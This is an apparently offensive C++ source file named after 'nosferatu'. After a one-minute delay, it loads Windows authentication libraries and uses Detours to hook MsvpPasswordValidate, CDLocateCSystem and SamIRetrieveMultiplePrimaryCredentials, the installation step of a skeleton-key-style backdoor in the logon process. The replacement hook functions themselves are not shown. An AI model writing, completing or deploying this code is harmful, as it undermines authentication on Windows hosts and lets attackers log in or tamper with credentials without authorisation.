#include "pch.h"
#include "nosferatu.h"

bool InstallHook()
{
	Sleep(60000);

	RAII::Library ntlmShared(L"NtlmShared.dll");
	RAII::Library cryptDll(L"cryptdll.dll");
	RAII::Library samSrv(L"samsrv.dll");
	if (ntlmShared.GetHandle() == nullptr || cryptDll.GetHandle() == nullptr || samSrv.GetHandle() == nullptr)
		return false;

	MsvpPasswordValidate = (pMsvpPasswordValidate)::GetProcAddress(ntlmShared.GetHandle(), "MsvpPasswordValidate");
	CDLocateCSystem = (pCDLocateCSystem)::GetProcAddress(cryptDll.GetHandle(), "CDLocateCSystem");
	SamIRetrieveMultiplePrimaryCredentials = (pSamIRetrieveMultiplePrimaryCredentials)::GetProcAddress(samSrv.GetHandle(), "SamIRetrieveMultiplePrimaryCredentials");
	if (MsvpPasswordValidate == nullptr || CDLocateCSystem == nullptr || SamIRetrieveMultiplePrimaryCredentials == nullptr)
		return false;

	DetourTransactionBegin();
	DetourUpdateThread(::GetCurrentThread());
	DetourAttach(&(PVOID&)MsvpPasswordValidate, HookMSVPPValidate);
	DetourAttach(&(PVOID&)CDLocateCSystem, HookCDLocateCSystem);
	DetourAttach(&(PVOID&)SamIRetrieveMultiplePrimaryCredentials, HookSamIRetrieveMultiplePrimaryCredentials);
	LONG eCode = DetourTransactionCommit();
	if (eCode != NO_ERROR)
		return false;
	else
		return true;
}
